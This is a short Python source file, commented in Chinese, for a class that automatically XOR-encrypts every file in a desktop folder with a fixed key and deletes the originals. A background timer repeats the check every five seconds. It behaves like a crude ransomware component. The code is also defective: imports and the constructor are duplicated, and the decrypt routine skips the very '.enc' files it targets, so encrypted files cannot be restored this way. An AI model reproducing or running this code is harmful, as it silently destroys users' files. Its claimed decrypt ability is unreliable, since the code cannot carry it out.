import os
import time
import os
import time
from threading import Timer

class EncryptHandler:
    def __init__(self, desktop_path, log_callback):
        self.desktop_path = desktop_path
        self.log = log_callback
        self.encrypted_suffix = '.enc'

    def __init__(self, desktop_path, log_callback):
        self.desktop_path = desktop_path
        self.log = log_callback
        self.encrypted_suffix = '.enc'
        self.last_files = set(os.listdir(desktop_path))
        self.start_polling()

    def start_polling(self):
        self.check_files()
        self.timer = Timer(5, self.start_polling)
        self.timer.daemon = True
        self.timer.start()

    def check_files(self):
        current_files = set(os.listdir(self.desktop_path))
        new_files = current_files - self.last_files
        for f in new_files:
            file_path = os.path.join(self.desktop_path, f)
            if os.path.isfile(file_path):
                self.process_file(file_path, encrypt=True)
        self.last_files = current_files

    def process_file(self, file_path, encrypt=True):
        try:
            if file_path.endswith(self.encrypted_suffix):
                return

            new_path = file_path + self.encrypted_suffix if encrypt else file_path[:-len(self.encrypted_suffix)]
            
            # 简单异或加密（密钥0x55）
            with open(file_path, 'rb') as f:
                data = bytearray(f.read())
            
            for i in range(len(data)):
                data[i] ^= 0x55

            with open(new_path, 'wb') as f:
                f.write(data)

            os.remove(file_path)
            action = '加密' if encrypt else '解密'
            self.log(f"{action}完成: {os.path.basename(file_path)}")

        except Exception as e:
            self.log(f"操作失败: {str(e)}")

    def encrypt_existing(self):
        for filename in os.listdir(self.desktop_path):
            file_path = os.path.join(self.desktop_path, filename)
            if os.path.isfile(file_path) and not filename.endswith(self.encrypted_suffix):
                self.process_file(file_path, encrypt=True)

    def decrypt_existing(self):
        for filename in os.listdir(self.desktop_path):
            file_path = os.path.join(self.desktop_path, filename)
            if os.path.isfile(file_path) and filename.endswith(self.encrypted_suffix):
                self.process_file(file_path, encrypt=False)